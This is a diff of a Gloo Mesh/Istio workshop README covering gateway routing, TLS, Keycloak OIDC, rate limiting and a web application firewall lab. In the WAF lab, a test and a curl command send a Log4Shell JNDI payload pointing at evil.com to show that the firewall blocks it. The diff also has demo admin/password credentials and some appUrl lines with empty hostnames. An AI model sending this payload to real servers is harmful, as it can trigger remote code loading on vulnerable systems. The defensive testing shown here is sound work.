@@ -36,9 +36,8 @@ source ./scripts/assert.sh
 * [Lab 20 - Expose an external API and stitch it with another one](#lab-20---expose-an-external-api-and-stitch-it-with-another-one-)
 * [Lab 21 - Expose the dev portal backend](#lab-21---expose-the-dev-portal-backend-)
 * [Lab 22 - Deploy and expose the dev portal frontend](#lab-22---deploy-and-expose-the-dev-portal-frontend-)
-* [Lab 23 - Validate user information with API key metadata and an external service](#lab-23---validate-user-information-with-api-key-metadata-and-an-external-service-)
-* [Lab 24 - Allow users to create their own API keys](#lab-24---allow-users-to-create-their-own-api-keys-)
-* [Lab 25 - Dev portal monetization](#lab-25---dev-portal-monetization-)
+* [Lab 23 - Allow users to create their own API keys](#lab-23---allow-users-to-create-their-own-api-keys-)
+* [Lab 24 - Dev portal monetization](#lab-24---dev-portal-monetization-)
 
 
 
@@ -318,12 +317,8 @@ until [[ $(kubectl --context ${MGMT} -n gloo-mesh get svc gloo-mesh-mgmt-server 
   sleep 1
 done
 -->
-Set the environment variable for the service corresponding to the Istio Ingress Gateway of the cluster(s):
-
 ```bash
-export ENDPOINT_HTTP_GW_CLUSTER1=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[].status.loadBalancer.ingress[0].*}'):80
-export ENDPOINT_HTTPS_GW_CLUSTER1=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[].status.loadBalancer.ingress[0].*}'):443
-export HOST_GW_CLUSTER1=$(echo ${ENDPOINT_HTTP_GW_CLUSTER1} | cut -d: -f1)
+export HOST_GW_CLUSTER1="$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[0].status.loadBalancer.ingress[0].*}')"
 ```
 <!--bash
 cat <<'EOF' > ./test.js
@@ -611,39 +606,6 @@ spec:
       name: grpc
 EOF
 ```
-Set the environment variable for the service corresponding to the Istio Ingress Gateway of the cluster(s):
-
-```bash
-export ENDPOINT_HTTP_GW_CLUSTER1=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[0].status.loadBalancer.ingress[0].*}'):80
-export ENDPOINT_HTTPS_GW_CLUSTER1=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[0].status.loadBalancer.ingress[0].*}'):443
-export HOST_GW_CLUSTER1=$(echo ${ENDPOINT_HTTP_GW_CLUSTER1} | cut -d: -f1)
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const dns = require('dns');
-const chaiHttp = require("chai-http");
-const chai = require("chai");
-const expect = chai.expect;
-chai.use(chaiHttp);
-const { waitOnFailedTest } = require('./tests/utils');
-
-afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});
-
-describe("Address '" + process.env.HOST_GW_CLUSTER1 + "' can be resolved in DNS", () => {
-    it(process.env.HOST_GW_CLUSTER1 + ' can be resolved', (done) => {
-        return dns.lookup(process.env.HOST_GW_CLUSTER1, (err, address, family) => {
-            expect(address).to.be.an.ip;
-            done();
-        });
-    });
-});
-EOF
-echo "executing test ./gloo-mesh-2-0/tests/can-resolve.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
--->
 
 This is what the environment looks like now:
 
@@ -819,11 +781,12 @@ kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: RouteTable
 metadata:
-  name: main
+  name: main-bookinfo
   namespace: istio-gateways
 spec:
   hosts:
-    - '*'
+    - cluster1-bookinfo.example.com
+    - cluster2-bookinfo.example.com
   virtualGateways:
     - name: north-south-gw
       namespace: istio-gateways
@@ -838,6 +801,35 @@ spec:
         routeTables:
           - labels:
               expose: "true"
+            workspace: bookinfo
+          - labels:
+              expose: "true"
+            workspace: gateways
+        sortMethod: ROUTE_SPECIFICITY
+---
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: main-httpbin
+  namespace: istio-gateways
+spec:
+  hosts:
+    - cluster1-httpbin.example.com
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: root
+      matchers:
+      - uri:
+          prefix: /
+      delegate:
+        routeTables:
+          - labels:
+              expose: "true"
+            workspace: httpbin
         sortMethod: ROUTE_SPECIFICITY
 EOF
 ```
@@ -877,20 +869,25 @@ spec:
               number: 9080
 EOF
 ```
+Let's add the domain to our `/etc/hosts` file:
 
-You should now be able to access the `productpage` application through the browser.
+```bash
+./scripts/register-domain.sh cluster1-bookinfo.example.com ${HOST_GW_CLUSTER1}
+./scripts/register-domain.sh cluster1-httpbin.example.com ${HOST_GW_CLUSTER1}
+```
 
 Get the URL to access the `productpage` service using the following command:
 ```
-echo "http://${ENDPOINT_HTTP_GW_CLUSTER1}/productpage"
+echo "http://cluster1-bookinfo.example.com/productpage"
 ```
 
+You should now be able to access the `productpage` application through the browser.
 <!--bash
 cat <<'EOF' > ./test.js
 const helpers = require('./tests/chai-http');
 
 describe("Productpage is available (HTTP)", () => {
-  it('/productpage is available in cluster1', () => helpers.checkURL({ host: 'http://' + process.env.ENDPOINT_HTTP_GW_CLUSTER1, path: '/productpage', retCode: 200 }));
+  it('/productpage is available in cluster1', () => helpers.checkURL({ host: `http://cluster1-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/bookinfo/gateway-expose/tests/productpage-available.test.js.liquid"
@@ -902,7 +899,6 @@ mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${te
 Gloo Mesh translates the `VirtualGateway` and `RouteTable` into the corresponding Istio objects (`Gateway` and `VirtualService`).
 
 Now, let's secure the access through TLS.
-
 Let's first create a private key and a self-signed certificate:
 
 ```bash
@@ -963,7 +959,7 @@ Notice that we specificed a minimumProtocolVersion, so if the client is trying t
 To test this, we can try to send a request with `tlsv1.2`:
 
 ```console
-curl --tlsv1.2 --tls-max 1.2 --key tls.key --cert tls.crt https://${ENDPOINT_HTTPS_GW_CLUSTER1}/productpage -k
+curl --tlsv1.2 --tls-max 1.2 --key tls.key --cert tls.crt https://cluster1-bookinfo.example.com/productpage -k
 ```
 
 You should get the following output:
@@ -975,13 +971,13 @@ curl: (35) error:1409442E:SSL routines:ssl3_read_bytes:tlsv1 alert protocol vers
 Now, you can try the most recent `tlsv1.3`:
 
 ```console
-curl --tlsv1.3 --tls-max 1.3 --key tls.key --cert tls.crt https://${ENDPOINT_HTTPS_GW_CLUSTER1}/productpage -k
+curl --tlsv1.3 --tls-max 1.3 --key tls.key --cert tls.crt https://cluster1-bookinfo.example.com/productpage -k
 ```
 
 And after this you should get the actual Productpage.
 Get the URL to access the `productpage` service using the following command:
 ```
-echo "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/productpage"
+echo "https://cluster1-bookinfo.example.com/productpage"
 ```
 
 <!--bash
@@ -989,7 +985,7 @@ cat <<'EOF' > ./test.js
 const helpers = require('./tests/chai-http');
 
 describe("Productpage is available (HTTPS)", () => {
-  it('/productpage is available in cluster1', () => helpers.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/productpage', retCode: 200 }));
+  it('/productpage is available in cluster1', () => helpers.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/bookinfo/gateway-expose/tests/productpage-available-secure.test.js.liquid"
@@ -1144,12 +1140,24 @@ spec:
 EOF
 ```
 
+You should now be able to access `httpbin.org` external service through the gateway.
+
+Make sure the domain is in our `/etc/hosts` file:
+
+```bash
+./scripts/register-domain.sh cluster1-httpbin.example.com ${HOST_GW_CLUSTER1}
+```
+
+Get the URL to access the `httpbin` service using the following command:
+```
+echo "https://cluster1-httpbin.example.com/get"
+```
 <!--bash
 cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
 describe("httpbin from the external service", () => {
-  it('Checking text \'X-Amzn-Trace-Id\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', body: 'X-Amzn-Trace-Id', match: true }));
+  it('Checking text \'X-Amzn-Trace-Id\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', body: 'X-Amzn-Trace-Id', match: true }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-external.test.js.liquid"
@@ -1157,13 +1165,6 @@ tempfile=$(mktemp)
 echo "saving errors in ${tempfile}"
 mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
 -->
-
-You should now be able to access `httpbin.org` external service through the gateway.
-
-Get the URL to access the `httpbin` service using the following command:
-```
-echo "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/get"
-```
 
 Let's update the `RouteTable` to direct 50% of the traffic to the local `httpbin` service:
 
@@ -1206,8 +1207,8 @@ cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
 describe("httpbin from the local service", () => {
-  it('Got the expected status code 200', () => helpersHttp.checkURL({ host: "https://" + process.env.ENDPOINT_HTTPS_GW_CLUSTER1 + "/get", retCode: 200 }));
-  it('Checking text \'X-Amzn-Trace-Id\' not in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', body: 'X-Amzn-Trace-Id', match: false }));
+  it('Got the expected status code 200', () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com/get`, retCode: 200 }));
+  it('Checking text \'X-Amzn-Trace-Id\' not in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', body: 'X-Amzn-Trace-Id', match: false }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-local.test.js.liquid"
@@ -1220,7 +1221,7 @@ cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
 describe("httpbin from the external service", () => {
-  it('Checking text \'X-Amzn-Trace-Id\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', body: 'X-Amzn-Trace-Id', match: true }));
+  it('Checking text \'X-Amzn-Trace-Id\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', body: 'X-Amzn-Trace-Id', match: true }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-external.test.js.liquid"
@@ -1268,8 +1269,8 @@ cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
 describe("httpbin from the local service", () => {
-  it('Got the expected status code 200', () => helpersHttp.checkURL({ host: "https://" + process.env.ENDPOINT_HTTPS_GW_CLUSTER1 + "/get", retCode: 200 }));
-  it('Checking text \'X-Amzn-Trace-Id\' not in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', body: 'X-Amzn-Trace-Id', match: false }));
+  it('Got the expected status code 200', () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com/get`, retCode: 200 }));
+  it('Checking text \'X-Amzn-Trace-Id\' not in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', body: 'X-Amzn-Trace-Id', match: false }));
 })
 EOF
 echo "executing test dist/gloo-mesh-2-0-gateway-standalone-portal/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-local.test.js.liquid"
@@ -1294,11 +1295,11 @@ kubectl --context ${CLUSTER1} -n httpbin delete externalservices.networking.gloo
 
 ## Lab 11 - Deploy Keycloak <a name="lab-11---deploy-keycloak-"></a>
 
-In many use cases, you need to restrict the access to your applications to authenticated users. 
+In many use cases, you need to restrict the access to your applications to authenticated users.
 
-OIDC (OpenID Connect) is an identity layer on top of the OAuth 2.0 protocol. In OAuth 2.0 flows, authentication is performed by an external Identity Provider (IdP) which, in case of success, returns an Access Token representing the user identity. The protocol does not define the contents and structure of the Access Token, which greatly reduces the portability of OAuth 2.0 implementations.
+OpenID Connect (OIDC) is an identity layer on top of the OAuth 2.0 protocol. In OAuth 2.0 flows, authentication is performed by an external Identity Provider (IdP) which, in case of success, returns an Access Token representing the user identity. The protocol does not define the contents and structure of the Access Token, which greatly reduces the portability of OAuth 2.0 implementations.
 
-The goal of OIDC is to address this ambiguity by additionally requiring Identity Providers to return a well-defined ID Token. OIDC ID tokens follow the JSON Web Token standard and contain specific fields that your applications can expect and handle. This standardization allows you to switch between Identity Providers – or support multiple ones at the same time – with minimal, if any, changes to your downstream services; it also allows you to consistently apply additional security measures like Role-based Access Control (RBAC) based on the identity of your users, i.e. the contents of their ID token.
+The goal of OIDC is to address this ambiguity by additionally requiring Identity Providers to return a well-defined ID Token. OIDC ID tokens follow the JSON Web Token standard and contain specific fields that your applications can expect and handle. This standardization allows you to switch between Identity Providers – or support multiple ones at the same time – with minimal, if any, changes to your downstream services; it also allows you to consistently apply additional security measures like Role-Based Access Control (RBAC) based on the identity of your users, i.e. the contents of their ID token.
 
 In this lab, we're going to install Keycloak. It will allow us to setup OIDC workflows later.
 
@@ -1343,7 +1344,7 @@ spec:
     spec:
       containers:
       - name: keycloak
-        image: quay.io/keycloak/keycloak:20.0.1
+        image: quay.io/keycloak/keycloak:22.0.5
         args: ["start-dev"]
         env:
         - name: KEYCLOAK_ADMIN
@@ -1466,37 +1467,65 @@ timeout 300 bash -c 'while [[ "$(curl -m 2 -s -o /dev/null -w ''%{http_code}'' $
 Now, we need to get a token:
 
 ```bash
-export KEYCLOAK_TOKEN=$(curl -m 2 -d "client_id=admin-cli" -d "username=admin" -d "password=admin" -d "grant_type=password" "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" | jq -r .access_token)
+export KEYCLOAK_TOKEN=$(curl -Ssm 10 --fail-with-body \
+  -d "client_id=admin-cli" \
+  -d "username=admin" \
+  -d "password=admin" \
+  -d "grant_type=password" \
+  "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" |
+  jq -r .access_token)
 ```
 
 After that, we configure Keycloak:
 
 ```bash
 # Create initial token to register the client
-read -r client token <<<$(curl -m 2 -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"expiration": 0, "count": 1}' $KEYCLOAK_URL/admin/realms/master/clients-initial-access | jq -r '[.id, .token] | @tsv')
-export KEYCLOAK_CLIENT=${client}
+read -r client token <<<$(curl -Ssm 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
+  -d '{ "expiration": 0, "count": 1 }' \
+  $KEYCLOAK_URL/admin/realms/master/clients-initial-access |
+  jq -r '[.id, .token] | @tsv')
+KEYCLOAK_CLIENT=${client}
 
 # Register the client
-read -r id secret <<<$(curl -m 2 -X POST -d "{ \"clientId\": \"${KEYCLOAK_CLIENT}\" }" -H "Content-Type:application/json" -H "Authorization: bearer ${token}" ${KEYCLOAK_URL}/realms/master/clients-registrations/default| jq -r '[.id, .secret] | @tsv')
-export KEYCLOAK_SECRET=${secret}
+read -r id secret <<<$(curl -Ssm 10 --fail-with-body -H "Authorization: bearer ${token}" -H "Content-Type: application/json" \
+  -d '{ "clientId": "'${KEYCLOAK_CLIENT}'" }' \
+  ${KEYCLOAK_URL}/realms/master/clients-registrations/default |
+  jq -r '[.id, .secret] | @tsv')
+KEYCLOAK_SECRET=${secret}
 
 # Add allowed redirect URIs
-curl -m 2 -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X PUT -H "Content-Type: application/json" -d '{"serviceAccountsEnabled": true, "directAccessGrantsEnabled": true, "authorizationServicesEnabled": true, "redirectUris": ["'https://${ENDPOINT_HTTPS_GW_CLUSTER1}'/callback","'https://${ENDPOINT_HTTPS_GW_CLUSTER1}'/*","'https://${ENDPOINT_HTTPS_GW_CLUSTER1}'/get"]}' $KEYCLOAK_URL/admin/realms/master/clients/${id}
+curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
+  -X PUT -d '{ "serviceAccountsEnabled": true, "directAccessGrantsEnabled": true, "authorizationServicesEnabled": true, "redirectUris": ["'https://cluster1-httpbin.example.com'/*","'https://cluster1-portal.example.com'/*","'https://cluster1-backstage.example.com'/*"] }' \
+  ${KEYCLOAK_URL}/admin/realms/master/clients/${id}
+
+# Set access token lifetime to 30m (default is 1m)
+curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
+  -X PUT -d '{ "accessTokenLifespan": 1800 }' \
+  ${KEYCLOAK_URL}/admin/realms/master
 
 # Add the group attribute in the JWT token returned by Keycloak
-curl -m 2 -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"name": "group", "protocol": "openid-connect", "protocolMapper": "oidc-usermodel-attribute-mapper", "config": {"claim.name": "group", "jsonType.label": "String", "user.attribute": "group", "id.token.claim": "true", "access.token.claim": "true"}}' $KEYCLOAK_URL/admin/realms/master/clients/${id}/protocol-mappers/models
+curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
+  -d '{ "name": "group", "protocol": "openid-connect", "protocolMapper": "oidc-usermodel-attribute-mapper", "config": { "claim.name": "group", "jsonType.label": "String", "user.attribute": "group", "id.token.claim": "true", "access.token.claim": "true" } }' \
+  ${KEYCLOAK_URL}/admin/realms/master/clients/${id}/protocol-mappers/models
 
 # Add the show_personal_data attribute in the JWT token returned by Keycloak
-curl -m 2 -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"name": "show_personal_data", "protocol": "openid-connect", "protocolMapper": "oidc-usermodel-attribute-mapper", "config": {"claim.name": "show_personal_data", "jsonType.label": "String", "user.attribute": "show_personal_data", "id.token.claim": "true", "access.token.claim": "true"}}' $KEYCLOAK_URL/admin/realms/master/clients/${id}/protocol-mappers/models
+curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
+  -d '{ "name": "show_personal_data", "protocol": "openid-connect", "protocolMapper": "oidc-usermodel-attribute-mapper", "config": { "claim.name": "show_personal_data", "jsonType.label": "String", "user.attribute": "show_personal_data", "id.token.claim": "true", "access.token.claim": "true"} } ' \
+  ${KEYCLOAK_URL}/admin/realms/master/clients/${id}/protocol-mappers/models
 
 # Create first user
-curl -m 2 -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"username": "user1", "email": "user1@example.com", "enabled": true, "attributes": {"group": "users"}, "credentials": [{"type": "password", "value": "password", "temporary": false}]}' $KEYCLOAK_URL/admin/realms/master/users
+curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
+  -d '{ "username": "user1", "email": "user1@example.com", "enabled": true, "attributes": { "group": "users" }, "credentials": [ { "type": "password", "value": "password", "temporary": false } ] }' \
+  ${KEYCLOAK_URL}/admin/realms/master/users
 
 # Create second user
-curl -m 2 -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"username": "user2", "email": "user2@solo.io", "enabled": true, "attributes": {"group": "users", "show_personal_data": false}, "credentials": [{"type": "password", "value": "password", "temporary": false}]}' $KEYCLOAK_URL/admin/realms/master/users
+curl -m 10 --fail-with-body -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -H "Content-Type: application/json" \
+  -d '{ "username": "user2", "email": "user2@solo.io", "enabled": true, "attributes": { "group": "users", "show_personal_data": false }, "credentials": [ { "type": "password", "value": "password", "temporary": false } ] }' \
+  ${KEYCLOAK_URL}/admin/realms/master/users
+
 ```
 
-> **Note:** If you get a *Not Authorized* error, please, re-run this command and continue from the command started to fail:
+> **Note:** If you get a *Not Authorized* error, please, re-run the following command and continue from the command that started to fail:
 
 ```
 KEYCLOAK_TOKEN=$(curl -m 2 -d "client_id=admin-cli" -d "username=admin" -d "password=admin" -d "grant_type=password" "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" | jq -r .access_token)
@@ -1549,7 +1578,7 @@ spec:
       configs:
       - oauth2:
           oidcAuthorizationCode:
-            appUrl: "https://${ENDPOINT_HTTPS_GW_CLUSTER1}"
+            appUrl: "https://"
             callbackPath: /callback
             clientId: ${KEYCLOAK_CLIENT}
             clientSecretRef:
@@ -1618,8 +1647,8 @@ describe("Authentication is working properly", function() {
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
   let keycloak_client_secret = buff.toString('ascii');
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it("The httpbin page isn't accessible without authenticating", () => helpersHttp.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', retCode: 302 }));
-  it("The httpbin page is accessible after authenticating", () => helpersHttp.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 }));
+  it("The httpbin page isn't accessible without authenticating", () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', retCode: 302 }));
+  it("The httpbin page is accessible after authenticating", () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 }));
 });
 
 EOF
@@ -1680,7 +1709,7 @@ spec:
       configs:
       - oauth2:
           oidcAuthorizationCode:
-            appUrl: "https://${ENDPOINT_HTTPS_GW_CLUSTER1}"
+            appUrl: "https://"
             callbackPath: /callback
             clientId: ${KEYCLOAK_CLIENT}
             clientSecretRef:
@@ -1688,7 +1717,7 @@ spec:
               namespace: httpbin
             issuerUrl: "${KEYCLOAK_URL}/realms/master/"
             logoutPath: /logout
-            afterLogoutUrl: "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/get"
+            afterLogoutUrl: "https:///get"
             session:
               failOnFetchFailure: true
               redis:
@@ -1826,7 +1855,7 @@ describe("Claim to header is working properly", function() {
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
   let keycloak_client_secret = buff.toString('ascii');
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('The new header has been added', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: '"X-Email": "user2@solo.io"' }));
+  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: '"X-Email": "user2@solo.io"' }));
 });
 
 EOF
@@ -1893,7 +1922,7 @@ describe("Tranformation is working properly", function() {
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
   let keycloak_client_secret = buff.toString('ascii');
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('The new header has been added', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: '"X-Organization": "solo.io"' }));
+  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: '"X-Organization": "solo.io"' }));
 });
 
 EOF
@@ -1960,7 +1989,7 @@ describe("DLP Policy", function () {
   let keycloak_client_secret = buff.toString('ascii');
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
 
-  it('Email is masked', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{ key: 'Authorization', value: 'Bearer ' + keycloak_token }], body: 'XXXXXXXXXX.io' }));
+  it('Email is masked', () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{ key: 'Authorization', value: 'Bearer ' + keycloak_token }], body: 'XXXXXXXXXX.io' }));
 });
 
 EOF
@@ -2090,7 +2119,7 @@ describe("Rate limiting is working properly", function() {
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
   let keycloak_client_secret = buff.toString('ascii');
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('The httpbin page should be rate limited', () => helpersHttp.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 429 }));
+  it('The httpbin page should be rate limited', () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 429 }));
 });
 
 EOF
@@ -2146,7 +2175,6 @@ kubectl --context ${CLUSTER1} -n httpbin delete ratelimitserverconfig httpbin
 ## Lab 17 - Use the Web Application Firewall filter <a name="lab-17---use-the-web-application-firewall-filter-"></a>
 [<img src="https://img.youtube.com/vi/9q2TxtBDqrA/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/9q2TxtBDqrA "Video Link")
 
-
 A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
 
 Gloo Mesh includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections. 
@@ -2193,11 +2221,11 @@ kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: RouteTable
 metadata:
-  name: main
+  name: main-httpbin
   namespace: istio-gateways
 spec:
   hosts:
-    - '*'
+    - cluster1-httpbin.example.com
   virtualGateways:
     - name: north-south-gw
       namespace: istio-gateways
@@ -2214,6 +2242,7 @@ spec:
         routeTables:
           - labels:
               expose: "true"
+            workspace: httpbin
         sortMethod: ROUTE_SPECIFICITY
 EOF
 ```
@@ -2226,7 +2255,7 @@ var chai = require('chai');
 var expect = chai.expect;
 
 describe("WAF is working properly", function() {
-  it('The request has been blocked', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'x-my-header', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
+  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', headers: [{key: 'x-my-header', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
 });
 
 EOF
@@ -2239,7 +2268,7 @@ mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${te
 Run the following command to simulate an attack:
 
 ```bash
-curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/get" -i
+curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://cluster1-httpbin.example.com/get" -i
 ```
 
 The request should be rejected:
@@ -2257,15 +2286,16 @@ Log4Shell malicious payload
 Let's apply the original `RouteTable` yaml:
 
 ```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
+kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: RouteTable
 metadata:
-  name: main
+  name: main-bookinfo
   namespace: istio-gateways
 spec:
   hosts:
-    - '*'
+    - cluster1-bookinfo.example.com
+    - cluster2-bookinfo.example.com
   virtualGateways:
     - name: north-south-gw
       namespace: istio-gateways
@@ -2280,6 +2310,35 @@ spec:
